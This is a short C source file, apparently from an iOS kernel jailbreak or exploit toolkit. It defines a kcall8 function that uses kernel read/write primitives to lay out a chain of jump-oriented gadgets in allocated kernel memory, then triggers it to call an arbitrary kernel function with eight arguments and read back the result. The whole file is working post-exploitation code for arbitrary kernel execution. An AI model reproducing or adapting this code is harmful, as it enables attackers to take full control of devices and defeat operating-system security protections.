#include "offsets.h"
#include "krw.h"
#include "kexecute.h"

uint64_t kcall8(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7) {
    uint64_t kpage = kalloc(0x1000);

    kwrite64(kpage, kpage);
    kwrite64(kpage + 0x98, kpage);
    kwrite64(kpage + 0x7C0, kgad(KGADGET_POPULATE));
    kwrite64(kpage + 0x10, kgad(KGADGET_MOV_X14_X3__BR_X4));
    kwrite64(kpage + 0x18, kpage + 0x800);
    kwrite64(kpage + 0x20, kgad(KGADGET_POPULATE));
    kwrite64(kpage + 0x28, kgad(KGADGET_MOV_X7_X14__BR_X15));
    kwrite64(kpage + 0x30, x7);
    kwrite64(kpage + 0x38, kgad(KGADGET_MOV_X15_X1__BR_X2));
    kwrite64(kpage + 0x810, kgad(KGADGET_MOV_X10_X1__BR_X3));
    kwrite64(kpage + 0x818, kpage + 0x840);
    kwrite64(kpage + 0x820, kgad(KGADGET_POPULATE));
    kwrite64(kpage + 0x828, kgad(KGADGET_POPULATE));
    kwrite64(kpage + 0x830, kgad(KGADGET_MOV_X11_X4__BR_X2));
    kwrite64(kpage + 0x838, addr);
    kwrite64(kpage + 0x850, kgad(KGADGET_MOV_X15_X2__BR_X3));
    kwrite64(kpage + 0x858, kpage + 0x880);
    kwrite64(kpage + 0x860, x6);
    kwrite64(kpage + 0x868, kgad(KGADGET_MOV_X6_X9__BR_X11));
    kwrite64(kpage + 0x870, kgad(KGADGET_MOV_X9_X1__BR_X10));
    kwrite64(kpage + 0x878, 0);
    kwrite64(kpage + 0x890, kgad(KGADGET_MOV_X5_X6__BR_X15));
    kwrite64(kpage + 0x898, x0);
    kwrite64(kpage + 0x8A0, x1);
    kwrite64(kpage + 0x8A8, x2);
    kwrite64(kpage + 0x8B0, x3);
    kwrite64(kpage + 0x8B8, x4);
    x6 = x5;

    uint64_t STORED_RET = kpage + 0x100;
    kexecute(kgad(KGADGET_PROLOGUE), kpage, STORED_RET, 0, 0, 0, x5, x6);

    uint64_t kret =  kread64(STORED_RET);
    kfree(kpage, 0x1000);
    return kret;
}